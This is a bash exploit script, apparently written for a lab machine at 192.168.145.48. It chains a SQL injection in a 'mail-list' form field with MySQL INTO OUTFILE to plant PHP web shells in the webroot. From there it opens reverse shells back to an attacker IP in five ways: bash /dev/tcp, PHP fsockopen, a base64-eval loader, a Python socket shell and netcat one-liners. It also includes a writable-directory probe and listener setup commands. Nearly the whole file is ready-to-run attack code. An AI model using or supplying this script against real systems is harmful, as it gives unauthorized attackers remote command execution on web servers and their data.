#!/bin/bash

# SQL Injection to Reverse Shell Exploitation
# Target: 192.168.145.48
# Vulnerability: Time-based blind SQLi with FILE privilege
# User: gollum@localhost

# Configuration
TARGET="http://192.168.145.48/index.php"
LHOST="192.168.45.5"  # Your Kali IP
LPORT="443"           # Listener port
WEBROOT="/var/www/html"  # Common webroot paths to try

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}[*] SQL Injection to Reverse Shell Exploit${NC}"
echo -e "${GREEN}[*] Target: $TARGET${NC}"
echo -e "${GREEN}[*] Attacker: $LHOST:$LPORT${NC}"

# ============================================
# Method 1: PHP System Shell via INTO OUTFILE
# ============================================

echo -e "\n${YELLOW}[+] Method 1: PHP Command Shell${NC}"

# Simple PHP command shell
write_php_shell() {
    local shell_name="shell_$RANDOM.php"
    local payload="<?php system(\$_GET['cmd']); ?>"

    echo -e "${GREEN}[*] Writing PHP shell to $WEBROOT/$shell_name${NC}"

    curl -X POST "$TARGET" \
        --data-urlencode "mail-list=test' UNION SELECT '$payload' INTO OUTFILE '$WEBROOT/$shell_name'-- -" \
        -s -o /dev/null

    # Test if shell was written
    sleep 2
    response=$(curl -s "http://192.168.145.48/$shell_name?cmd=id" 2>/dev/null)

    if [[ $response == *"uid="* ]]; then
        echo -e "${GREEN}[+] Shell uploaded successfully: http://192.168.145.48/$shell_name${NC}"
        echo -e "${GREEN}[+] Triggering reverse shell...${NC}"

        # Trigger reverse shell
        curl -s "http://192.168.145.48/$shell_name?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'" &
        return 0
    else
        echo -e "${RED}[-] Failed to write shell to $WEBROOT/$shell_name${NC}"
        return 1
    fi
}

# ============================================
# Method 2: PHP Reverse Shell via INTO OUTFILE
# ============================================

echo -e "\n${YELLOW}[+] Method 2: Direct PHP Reverse Shell${NC}"

write_reverse_shell() {
    local shell_name="rev_$RANDOM.php"

    # Compact PHP reverse shell
    local payload='<?php $sock=fsockopen("'$LHOST'",'$LPORT');exec("/bin/sh -i <&3 >&3 2>&3");?>'

    echo -e "${GREEN}[*] Writing reverse shell to $WEBROOT/$shell_name${NC}"

    # Using hexadecimal encoding to avoid quote issues
    local hex_payload=$(echo -n "$payload" | xxd -p | tr -d '\n')

    curl -X POST "$TARGET" \
        --data-urlencode "mail-list=test' UNION SELECT UNHEX('$hex_payload') INTO OUTFILE '$WEBROOT/$shell_name'-- -" \
        -s -o /dev/null

    # Trigger the reverse shell
    sleep 2
    echo -e "${GREEN}[*] Triggering reverse shell at http://192.168.145.48/$shell_name${NC}"
    curl -s "http://192.168.145.48/$shell_name" &
}

# ============================================
# Method 3: Base64 Encoded Payload
# ============================================

echo -e "\n${YELLOW}[+] Method 3: Base64 Encoded Reverse Shell${NC}"

write_base64_shell() {
    local shell_name="b64_$RANDOM.php"

    # Create base64 encoded reverse shell
    local php_code='<?php
$ip="'$LHOST'";
$port='$LPORT';
$sock=fsockopen($ip,$port);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>'

    local b64_payload=$(echo -n "$php_code" | base64 -w0)

    echo -e "${GREEN}[*] Writing base64 shell to $WEBROOT/$shell_name${NC}"

    # Write base64 decoded PHP
    curl -X POST "$TARGET" \
        --data-urlencode "mail-list=test' UNION SELECT '<?php eval(base64_decode(\"$b64_payload\")); ?>' INTO OUTFILE '$WEBROOT/$shell_name'-- -" \
        -s -o /dev/null

    # Trigger
    sleep 2
    echo -e "${GREEN}[*] Triggering base64 shell${NC}"
    curl -s "http://192.168.145.48/$shell_name" &
}

# ============================================
# Method 4: Python Reverse Shell via System
# ============================================

echo -e "\n${YELLOW}[+] Method 4: Python Reverse Shell${NC}"

python_reverse_shell() {
    local shell_name="cmd_$RANDOM.php"
    local py_cmd="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"

    echo -e "${GREEN}[*] Writing command executor${NC}"

    curl -X POST "$TARGET" \
        --data-urlencode "mail-list=test' UNION SELECT '<?php system(\"$py_cmd\"); ?>' INTO OUTFILE '$WEBROOT/$shell_name'-- -" \
        -s -o /dev/null

    sleep 2
    echo -e "${GREEN}[*] Executing Python reverse shell${NC}"
    curl -s "http://192.168.145.48/$shell_name" &
}

# ============================================
# Method 5: Netcat Reverse Shell
# ============================================

echo -e "\n${YELLOW}[+] Method 5: Netcat Reverse Shell${NC}"

netcat_reverse_shell() {
    local shell_name="nc_$RANDOM.php"

    # Try different netcat variants
    local nc_cmds=(
        "nc -e /bin/sh $LHOST $LPORT"
        "nc -c /bin/sh $LHOST $LPORT"
        "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
    )

    for nc_cmd in "${nc_cmds[@]}"; do
        echo -e "${GREEN}[*] Trying: $nc_cmd${NC}"

        curl -X POST "$TARGET" \
            --data-urlencode "mail-list=test' UNION SELECT '<?php system(\"$nc_cmd &\"); ?>' INTO OUTFILE '$WEBROOT/${shell_name}_$i.php'-- -" \
            -s -o /dev/null

        sleep 1
        curl -s "http://192.168.145.48/${shell_name}_$i.php" &
        ((i++))
    done
}

# ============================================
# Alternative: Find Writable Directories
# ============================================

find_writable_dirs() {
    echo -e "\n${YELLOW}[+] Finding Writable Directories${NC}"

    local dirs=(
        "/var/www/html"
        "/tmp"
        "/var/tmp"
        "/dev/shm"
        "/var/www/uploads"
        "/var/www/html/uploads"
        "/var/www/html/images"
        "/var/www/html/files"
    )

    for dir in "${dirs[@]}"; do
        local test_file="test_$RANDOM.txt"
        echo -e "${GREEN}[*] Testing: $dir/$test_file${NC}"

        curl -X POST "$TARGET" \
            --data-urlencode "mail-list=test' UNION SELECT 'writable' INTO OUTFILE '$dir/$test_file'-- -" \
            -s -o /dev/null -w "%{http_code}\n"
    done
}

# ============================================
# Setup Listener
# ============================================

setup_listener() {
    echo -e "\n${YELLOW}[+] Setting up listener on port $LPORT${NC}"
    echo -e "${GREEN}[*] Run this in another terminal:${NC}"
    echo -e "${GREEN}nc -lvnp $LPORT${NC}"
    echo -e "${GREEN}OR${NC}"
    echo -e "${GREEN}msfconsole -q -x \"use exploit/multi/handler; set payload linux/x86/shell_reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run\"${NC}"
}

# ============================================
# Main Execution
# ============================================

echo -e "\n${YELLOW}[!] Starting exploitation...${NC}"

# Setup listener reminder
setup_listener

echo -e "\n${YELLOW}[?] Press Enter when listener is ready...${NC}"
read

# Try methods in order
echo -e "\n${GREEN}[*] Attempting exploitation methods...${NC}"

# Method 1: Simple PHP shell
write_php_shell
if [ $? -eq 0 ]; then
    echo -e "${GREEN}[+] Exploitation successful!${NC}"
    exit 0
fi

# Method 2: Direct reverse shell
write_reverse_shell
sleep 5

# Method 3: Base64 encoded
write_base64_shell
sleep 5

# Method 4: Python reverse shell
python_reverse_shell
sleep 5

# Method 5: Netcat variants
netcat_reverse_shell

echo -e "\n${YELLOW}[*] Check your listener for incoming connections${NC}"
echo -e "${YELLOW}[*] If no connection, try finding writable directories:${NC}"
echo -e "${GREEN}./reverse_shell_exploit.sh find_dirs${NC}"

# Check if user wants to find writable directories
if [ "$1" == "find_dirs" ]; then
    find_writable_dirs
fi